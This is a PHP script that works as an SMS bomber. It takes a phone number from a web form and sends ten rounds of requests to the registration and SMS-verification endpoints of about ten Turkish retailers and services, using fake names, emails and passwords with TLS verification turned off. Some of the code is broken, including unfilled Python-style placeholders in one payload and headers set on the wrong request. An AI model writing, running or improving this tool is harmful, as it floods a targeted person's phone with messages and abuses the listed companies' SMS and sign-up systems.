<?php
$telno = $_POST["tel"];

//Link Listesi
$bimlink = "https://bim.veesk.net:443/service/v1.0/account/login";
$englishhomelink = "https://www.englishhome.com:443/enh_app/users/registration/";
$sakasulink = "https://www.sakasu.com.tr:443/app/api_register/step1";
$migroslink = "https://rest.sanalmarket.com.tr:443/sanalmarket/users/login/otp";
$tiklagelsinlink = "https://svc.apps.tiklagelsin.com:443/user/graphql";
$ceptesoklink = "https://api.ceptesok.com:443/api/users/sendsms";
$naoslink = "https://shop.naosstars.com/users/register/";
$gediklink = "https://web.gediktrader.com/v/controllers/gedikRegistrationPhase1";
$kahvelink = "https://core.kahvedunyasi.com/api/users/sms/send";
$kigililink = "https://www.kigili.com/users/registration/";
//Link Listesi Bitiş

//Json Data Gönderecegimiz İcin HEADER Kısmı
$headers = array(
   "Accept: application/json",
   "Content-Type: application/json",
);
//Header Kısmı Bitiş
if($_POST["tel"]){

        
for ($i = 0; $i < 10; $i++) {
$bim = curl_init($bimlink);
curl_setopt($bim, CURLOPT_URL, $bimlink);
curl_setopt($bim, CURLOPT_POST, true);
curl_setopt($bim, CURLOPT_RETURNTRANSFER, true);


curl_setopt($bim, CURLOPT_HTTPHEADER, $headers);

$bimdata = <<<DATA
{
"phone":$telno
}
DATA;
curl_setopt($bim, CURLOPT_POSTFIELDS, $bimdata);

//for debug only!
curl_setopt($bim, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($bim, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($bim);
curl_close($bim);

$saka = curl_init($sakasulink);
curl_setopt($saka, CURLOPT_URL, $sakasulink);
curl_setopt($saka, CURLOPT_POST, true);
curl_setopt($saka, CURLOPT_RETURNTRANSFER, true);
curl_setopt($saka, CURLOPT_HTTPHEADER, $headers);

$sakadata = <<<DATA
{
	"first_name": "BORA",
	"last_name": "DESPAIR",
	"email": "{self.random_mail}@gmail.com",
	"phone": "0{self.phone}",
	"password": "31ABC..abc31",
	"email_allowed": "true",
	"sms_allowed": "true",
	"confirm": "true",
	"tom_pay_allowed": "true"
}
DATA;
curl_setopt($saka, CURLOPT_POSTFIELDS, $sakadata);
curl_setopt($saka, CURLOPT_SSL_VERIFYHOST, true);
curl_setopt($saka, CURLOPT_SSL_VERIFYPEER, false);

$resps = curl_exec($saka);
curl_close($saka);




$englishhome = curl_init($englishhomelink);
curl_setopt($englishhome, CURLOPT_URL, $englishhomelink);
curl_setopt($englishhome, CURLOPT_POST, true);
curl_setopt($englishhome, CURLOPT_RETURNTRANSFER, true);

curl_setopt($englishhome, CURLOPT_HTTPHEADER, $headers);
$englishhomedata = <<<DATA
{
	"first_name": "BORA",
	"last_name": "DESPAIR",
	"email": "self@gmail.com",
	"phone": "0{$telno}",
	"password": "31ABC..abc31",
	"email_allowed": "true",
	"sms_allowed": "true",
	"confirm": "true",
	"tom_pay_allowed": "true"
}
DATA;
curl_setopt($englishhome, CURLOPT_POSTFIELDS, $englishhomedata);
curl_setopt($englishhome, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($englishhome, CURLOPT_SSL_VERIFYPEER, false);
$respss = curl_exec($englishhome);
curl_close($englishhome);

$migros = curl_init($migroslink);
curl_setopt($migros, CURLOPT_URL, $migroslink);
curl_setopt($migros, CURLOPT_POST, true);
curl_setopt($migros, CURLOPT_RETURNTRANSFER, true);
curl_setopt($englishhome, CURLOPT_HTTPHEADER, $headers);
$migrosdata = <<<DATA
{
	"phoneNumber": $telno
}
DATA;
curl_setopt($migros, CURLOPT_POSTFIELDS, $migrosdata);
curl_setopt($migros, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($migros, CURLOPT_SSL_VERIFYPEER, false);

$respsss = curl_exec($migros);
curl_close($migros);

$tiklagelsin = curl_init($tiklagelsinlink);
curl_setopt($tiklagelsin, CURLOPT_URL, $tiklagelsinlink);
curl_setopt($tiklagelsin, CURLOPT_POST, true);
curl_setopt($tiklagelsin, CURLOPT_RETURNTRANSFER, true);
curl_setopt($tiklagelsin, CURLOPT_HTTPHEADER, $headers);
$tiklagelsindata=<<<DATA
{"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
"deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
"phone": $telno
}
DATA;
curl_setopt($tiklagelsin, CURLOPT_POSTFIELDS, $tiklagelsindata);

//for debug only!
curl_setopt($tiklagelsin, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($tiklagelsin, CURLOPT_SSL_VERIFYPEER, false);

$respssss = curl_exec($tiklagelsin);
curl_close($tiklagelsin);

$ceptesok = curl_init($ceptesoklink);
curl_setopt($ceptesok, CURLOPT_URL, $ceptesoklink);
curl_setopt($ceptesok, CURLOPT_POST, true);
curl_setopt($ceptesok, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ceptesok, CURLOPT_HTTPHEADER, $headers);
$ceptesokdata=<<<DATA
{
	"mobile_number": $telno,
	"token_type": "register_token"
}
DATA;
curl_setopt($ceptesok, CURLOPT_POSTFIELDS, $ceptesokdata);

//for debug only!
curl_setopt($ceptesok, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ceptesok, CURLOPT_SSL_VERIFYPEER, false);

$respsssss = curl_exec($ceptesok);
curl_close($ceptesok);


$naos = curl_init($naoslink);
curl_setopt($naos, CURLOPT_URL, $naoslink);
curl_setopt($naos, CURLOPT_POST, true);
curl_setopt($naos, CURLOPT_RETURNTRANSFER, true);
curl_setopt($naos, CURLOPT_HTTPHEADER, $headers);
$naosdata=<<<DATA
{
                "email": "self@gmail.com",
                "first_name": "BORA",
                "last_name": "DESPAIR",
                "password": "31ABC..abc31",
                "date_of_birth": "1975-12-31",
                "phone": "0{$telno}",
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
}
DATA;
curl_setopt($naos, CURLOPT_POSTFIELDS, $naosdata);

//for debug only!
curl_setopt($naos, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($naos, CURLOPT_SSL_VERIFYPEER, false);

$respssssss = curl_exec($naos);
curl_close($naos);


$gedik = curl_init($gediklink);
curl_setopt($gedik, CURLOPT_URL, $gediklink);
curl_setopt($gedik, CURLOPT_POST, true);
curl_setopt($gedik, CURLOPT_RETURNTRANSFER, true);
curl_setopt($gedik, CURLOPT_HTTPHEADER, $headers);
$gedikdata=<<<DATA
{
   "username": "BORA",
   "surname": "DESPAIR",
   "email": "SELF@gmail.com",
   "password": "31ABCabc31",
   "phone": "+90{$telno}",
   "city": "aydin",
   "address": "asdasd",
   "from": "registerform"
}
DATA;
curl_setopt($gedik, CURLOPT_POSTFIELDS, $gedikdata);
curl_setopt($gedik, CURLOPT_SSL_VERIFYHOST, true);
curl_setopt($gedik, CURLOPT_SSL_VERIFYPEER, false);

$respsssssss = curl_exec($gedik);
curl_close($gedik);

$kahve = curl_init($kahvelink);
curl_setopt($kahve, CURLOPT_URL, $kahvelink);
curl_setopt($kahve, CURLOPT_POST, true);
curl_setopt($kahve, CURLOPT_RETURNTRANSFER, true);
curl_setopt($kahve, CURLOPT_HTTPHEADER, $headers);
$kahvedata=<<<DATA
{
  "mobile_number": $telno,
  "token_type": "register_token"
}
DATA;
curl_setopt($kahve, CURLOPT_POSTFIELDS, $kahvedata);
curl_setopt($kahve, CURLOPT_SSL_VERIFYHOST, true);
curl_setopt($kahve, CURLOPT_SSL_VERIFYPEER, false);

$respssssssss = curl_exec($kahve);
curl_close($kahve);

$kigili = curl_init($kigililink);
curl_setopt($kigili, CURLOPT_URL, $kigililink);
curl_setopt($kigili, CURLOPT_POST, true);
curl_setopt($kigili, CURLOPT_RETURNTRANSFER, true);
curl_setopt($kigili, CURLOPT_HTTPHEADER, $headers);
$kigilidata=<<<DATA
{
 "first_name": "BORA",
                "last_name": "DESPAIR",
                "email": "self@gmail.com",
                "phone": "0{$telno}",
                "password": "31ABC..abc31",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
}
DATA;
curl_setopt($kigili, CURLOPT_POSTFIELDS, $kigilidata);
curl_setopt($kigili, CURLOPT_SSL_VERIFYHOST, true);
curl_setopt($kigili, CURLOPT_SSL_VERIFYPEER, false);

$respsssssssss = curl_exec($kigili);
curl_close($kigili);


header("location: ".$_SERVER['HTTP_REFERER']."?success=true");
}
}else{
header("location: ".$_SERVER['HTTP_REFERER']."?success=false");
}
?>